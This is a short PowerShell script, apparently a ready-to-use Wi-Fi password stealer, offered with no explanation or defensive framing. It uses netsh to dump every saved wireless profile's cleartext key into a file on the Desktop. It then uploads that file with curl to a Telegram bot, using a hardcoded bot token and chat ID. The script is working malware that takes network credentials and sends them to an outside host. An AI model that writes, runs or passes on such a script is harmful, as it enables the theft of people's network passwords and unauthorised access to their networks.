$tk='8941312536:AAEXnB9avDFxvYiSuBnCuHcPDshuQErU--s'
$ci='-5268156839'
netsh wlan show profiles|Select-String 'All User Profile'|%{
  $n=($_ -split ':')[1].Trim()
  $p=(netsh wlan show profile name=$n key=clear|Select-String 'Key Content')
  if($p){"$n : "+(($p -split ':')[1].Trim())}
}|Out-File $env:USERPROFILE\Desktop\r00t_b0t.txt -Encoding UTF8
curl.exe -s -X POST https://api.telegram.org/bot$tk/sendDocument -F chat_id=$ci -F document=@$env:USERPROFILE\Desktop\r00t_b0t.txt
